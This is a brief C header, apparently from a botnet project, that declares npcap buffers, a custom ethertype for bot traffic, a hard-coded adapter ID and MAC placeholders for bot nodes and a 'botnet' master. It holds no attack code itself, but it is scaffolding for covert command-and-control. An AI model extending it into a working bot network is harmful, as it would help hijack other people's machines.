#pragma once
#include <stdint.h>

// errbuff for npcap error messages
char errbuff[PCAP_ERRBUF_SIZE];

// general purpose constants
const u_char broadcast_mac[6] = {255, 255, 255, 255, 255, 255};
const int bot_ethertype = 1513;

// adapter and bot_master_mac - may change
char* adapter_id = "\\Device\\NPF_{EE28EB53-E495-4860-BBC4-3E6F22BFA910}";
const char bot_master_mac[6] = "botnet";

// bot_node-specific - will be resolved in the beggining of program
u_char bot_node_mac[6];
u_char bot_node_ip[4];
